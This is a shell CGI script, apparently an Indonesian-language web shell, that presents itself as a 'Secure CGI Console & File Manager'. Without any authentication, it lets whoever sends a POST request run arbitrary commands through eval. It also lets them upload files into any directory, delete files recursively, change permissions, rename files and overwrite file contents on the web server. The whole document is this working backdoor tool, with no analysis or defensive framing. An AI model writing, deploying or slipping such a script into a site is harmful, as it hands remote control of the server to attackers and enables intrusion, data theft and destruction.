#!/bin/sh
echo "Content-Type: text/html"
echo ""

BASE_DIR="/var/www/html"
CURRENT_DIR="$BASE_DIR"
EDITING_FILE=""
FILE_CONTENT=""

# Proses Data POST
if [ "$REQUEST_METHOD" = "POST" ] && [ -n "$CONTENT_LENGTH" ]; then
  tmpfile=$(mktemp)
  cat > "$tmpfile"
  RAW_DATA=$(cat "$tmpfile")

  is_multipart=$(echo "$CONTENT_TYPE" | grep -i "multipart/form-data")

  if [ -n "$is_multipart" ]; then
    # Penanganan Upload Berkas
    CURRENT_DIR=$(grep -a -A 1 'name="current_dir"' "$tmpfile" | tail -n 1 | tr -d '\r' | xargs)
    [ -z "$CURRENT_DIR" ] || [ ! -d "$CURRENT_DIR" ] && CURRENT_DIR="$BASE_DIR"

    fname=$(grep -a "filename=" "$tmpfile" | head -n 1 | cut -d\" -f4 | tr -d '\r')
    if [ -n "$fname" ]; then
      sed -e "1,/Content-Type:/d" "$tmpfile" | tail -n +2 | head -n -1 > "$CURRENT_DIR/$fname"
      echo "<p style=\"color:#0f0\">[+] Sukses: Berkas <b>$fname</b> berhasil diunggah.</p>"
    fi
  else
    # Parsing Parameter Aksi Umum
    ACTION=$(echo "$RAW_DATA" | grep -oE 'action=[^&]*' | cut -d= -f2)
    DIR_ENCODED=$(echo "$RAW_DATA" | grep -oE 'current_dir=[^&]*' | cut -d= -f2)
    PAYLOAD_ENCODED=$(echo "$RAW_DATA" | grep -oE 'payload=[^&]*' | cut -d= -f2)
    
    CURRENT_DIR=$(echo "$DIR_ENCODED" | tr '+' ' ' | sed "s/%/\\\\x/g" | xargs -0 printf "%b" 2>/dev/null)
    PAYLOAD=$(echo "$PAYLOAD_ENCODED" | tr '+' ' ' | sed "s/%/\\\\x/g" | xargs -0 printf "%b" 2>/dev/null)

    [ -z "$CURRENT_DIR" ] || [ ! -d "$CURRENT_DIR" ] && CURRENT_DIR="$BASE_DIR"

    if [ "$ACTION" = "cmd" ] && [ -n "$PAYLOAD" ]; then
      echo "<p style=\"color:#fff\">Executing: <b>$PAYLOAD</b></p>"
      echo "<pre style=\"background:#111;color:#0f0;padding:10px;border:1px solid #444;white-space:pre-wrap;\">"
      cd "$CURRENT_DIR" && eval "$PAYLOAD" 2>&1
      echo "</pre><hr style=\"border:1px solid #444;\">"
    
    elif [ "$ACTION" = "delete" ] && [ -n "$PAYLOAD" ]; then
      rm -rf "$CURRENT_DIR/$PAYLOAD"
      echo "<p style=\"color:#0f0\">[+] Sukses: <b>$PAYLOAD</b> berhasil dihapus.</p>"

    elif [ "$ACTION" = "chmod" ] && [ -n "$PAYLOAD" ]; then
      T_NAME=$(echo "$PAYLOAD" | cut -d '|' -f1)
      MODE=$(echo "$PAYLOAD" | cut -d '|' -f2 | grep -oE '^[0-7]{3,4}$')
      [ -e "$CURRENT_DIR/$T_NAME" ] && [ -n "$MODE" ] && chmod "$MODE" "$CURRENT_DIR/$T_NAME"
      echo "<p style=\"color:#0f0\">[+] Sukses: Izin $T_NAME diubah menjadi $MODE.</p>"

    elif [ "$ACTION" = "rename" ] && [ -n "$PAYLOAD" ]; then
      OLD_NAME=$(echo "$PAYLOAD" | cut -d '|' -f1)
      NEW_NAME=$(echo "$PAYLOAD" | cut -d '|' -f2 | tr -d ' /\\')
      if [ -e "$CURRENT_DIR/$OLD_NAME" ] && [ -n "$NEW_NAME" ]; then
        mv "$CURRENT_DIR/$OLD_NAME" "$CURRENT_DIR/$NEW_NAME"
        echo "<p style=\"color:#0f0\">[+] Sukses: Berhasil mengubah nama menjadi $NEW_NAME.</p>"
      fi

    elif [ "$ACTION" = "edit_view" ] && [ -n "$PAYLOAD" ]; then
      if [ -f "$CURRENT_DIR/$PAYLOAD" ]; then
        EDITING_FILE="$PAYLOAD"
        FILE_CONTENT=$(cat "$CURRENT_DIR/$PAYLOAD" 2>/dev/null)
      fi

    elif [ "$ACTION" = "save_file" ] && [ -n "$PAYLOAD" ]; then
      TARGET_EDIT=$(echo "$PAYLOAD" | cut -d '|' -f1)
      # Mengambil teks konten baru dari raw post data
      NEW_CONTENT=$(echo "$RAW_DATA" | grep -oE 'content=[^&]*' | cut -d= -f2 | tr '+' ' ' | sed "s/%/\\\\x/g" | xargs -0 printf "%b" 2>/dev/null)
      if [ -f "$CURRENT_DIR/$TARGET_EDIT" ]; then
        echo "$NEW_CONTENT" > "$CURRENT_DIR/$TARGET_EDIT"
        echo "<p style=\"color:#0f0\">[+] Sukses: Isi berkas <b>$TARGET_EDIT</b> berhasil diperbarui.</p>"
      fi
    fi
  fi
  rm -f "$tmpfile"
fi

# Template Tampilan Antarmuka
echo "<html><head><title>Secure CGI Advanced Manager</title></head><body style=\"font-family:monospace;background:#222;color:#fff;padding:20px;\">"
echo "<div style=\"max-width:1100px;margin:auto;\">"
echo "<h2>Secure CGI Console & File Manager</h2><hr style=\"border:1px solid #444;\">"

# 1. Konsol Perintah Terminal
echo "<h3>1. Terminal Command Execution (Rute Aktif: $CURRENT_DIR)</h3>"
echo "<form method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"cmd\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR\">"
echo "<span style=\"color:#fff\">cmd$</span> <input type=\"text\" name=\"payload\" style=\"background:#333;color:#0f0;border:1px solid #555;width:70%;padding:5px;\" autofocus> <input type=\"submit\" value=\"Execute\"></form>"

# 2. Fitur Unggah Berkas
echo "<h3>2. Unggah Berkas ke Direktori Aktif</h3>"
echo "<form enctype=\"multipart/form-data\" method=\"POST\" style=\"background:#333;padding:12px;border:1px solid #444;\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR\">"
echo "<input type=\"file\" name=\"f\"> <input type=\"submit\" value=\"Upload File\"></form>"

# Fitur Penyuntingan Teks Berkas (Hanya Muncul saat Tombol Edit Diklik)
if [ -n "$EDITING_FILE" ]; then
  echo "<h3>📝 Menyunting Berkas: <span style=\"color:#0f0;\">$EDITING_FILE</span></h3>"
  echo "<form method=\"POST\" style=\"background:#2b2b2b;padding:15px;border:1px solid #555;\">"
  echo "<input type=\"hidden\" name=\"action\" value=\"save_file\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR\"><input type=\"hidden\" name=\"payload\" value=\"$EDITING_FILE\">"
  echo "<textarea name=\"content\" style=\"width:100%;height:250px;background:#1e1e1e;color:#fff;font-family:monospace;padding:10px;border:1px solid #444;\">$(echo "$FILE_CONTENT" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')</textarea><br><br>"
  echo "<input type=\"submit\" value=\"Simpan Perubahan\" style=\"background:#050;color:#fff;padding:5px 15px;cursor:pointer;\">"
  echo "</form><hr style=\"border:1px solid #444;\">"
fi

# 3. Tabel Utama File Manager & Navigasi Direktori
echo "<h3>3. File Manager (Lokasi: <span style=\"color:#0f0;\">$CURRENT_DIR</span>)</h3>"
PARENT_DIR=$(dirname "$CURRENT_DIR")
echo "<form method=\"POST\" style=\"margin-bottom:15px;\"><input type=\"hidden\" name=\"action\" value=\"nav\"><input type=\"hidden\" name=\"current_dir\" value=\"$PARENT_DIR\"><input type=\"submit\" value=\"📁 .. (Naik Satu Folder)\" style=\"padding:5px 10px;background:#444;color:#fff;border:1px solid #666;cursor:pointer;\"></form>"

echo "<table border=\"1\" cellpadding=\"5\" cellspacing=\"0\" style=\"border-color:#444;width:100%;color:#fff;text-align:left;\">"
echo "<tr style=\"background:#333;\"><th>Nama File / Folder</th><th>Jenis</th><th>Ukuran</th><th>Izin</th><th>Aksi Modifikasi</th></tr>"

for item in "$CURRENT_DIR"/*; do
  bname=$(basename "$item")
  [ "$bname" = "*" ] || [ ! -e "$item" ] && continue

  fsize=$(du -sh "$item" 2>/dev/null | cut -f1)
  fperms=$(stat -c "%a" "$item" 2>/dev/null || stat -f "%Op" "$item" 2>/dev/null | cut -c 4-6)
  
  echo "<tr>"
  if [ -d "$item" ]; then
    echo "<td>📁 <b>$bname/</b></td><td>Folder</td><td>$fsize</td><td>$fperms</td>"
    echo "<td>"
    echo "<form method=\"POST\" style=\"display:inline;\"><input type=\"hidden\" name=\"action\" value=\"nav\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR/$bname\"><input type=\"submit\" value=\"Buka\"></form> "
    echo "<form method=\"POST\" style=\"display:inline;\"><input type=\"hidden\" name=\"action\" value=\"delete\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR\"><input type=\"hidden\" name=\"payload\" value=\"$bname\"><input type=\"submit\" value=\"Hapus\" onclick=\"return confirm('Hapus folder?')\"></form> "
    echo "<form method=\"POST\" style=\"display:inline;\"><input type=\"hidden\" name=\"action\" value=\"rename\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR\"><input type=\"text\" name=\"payload\" value=\"$bname|$bname\" style=\"width:100px;background:#333;color:#fff;border:1px solid #555;\"> <input type=\"submit\" value=\"Rename\"></form>"
    echo "</td>"
  else
    echo "<td>📄 $bname</td><td>Berkas</td><td>$fsize</td><td>$fperms</td>"
    echo "<td>"
    echo "<form method=\"POST\" style=\"display:inline;\"><input type=\"hidden\" name=\"action\" value=\"edit_view\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR\"><input type=\"hidden\" name=\"payload\" value=\"$bname\"><input type=\"submit\" value=\"Edit\"></form> "
    echo "<form method=\"POST\" style=\"display:inline;\"><input type=\"hidden\" name=\"action\" value=\"delete\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR\"><input type=\"hidden\" name=\"payload\" value=\"$bname\"><input type=\"submit\" value=\"Hapus\" onclick=\"return confirm('Hapus file?')\"></form> "
    echo "<form method=\"POST\" style=\"display:inline;\"><input type=\"hidden\" name=\"action\" value=\"chmod\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR\"><input type=\"text\" name=\"payload\" value=\"$bname|$fperms\" style=\"width:50px;background:#333;color:#fff;border:1px solid #555;\"> <input type=\"submit\" value=\"Chmod\"></form> "
    echo "<form method=\"POST\" style=\"display:inline;\"><input type=\"hidden\" name=\"action\" value=\"rename\"><input type=\"hidden\" name=\"current_dir\" value=\"$CURRENT_DIR\"><input type=\"text\" name=\"payload\" value=\"$bname|$bname\" style=\"width:100px;background:#333;color:#fff;border:1px solid #555;\"> <input type=\"submit\" value=\"Rename\"></form>"
    echo "</td>"
  fi
  echo "</tr>"
done

echo "</table>"
echo "</div></body></html>"
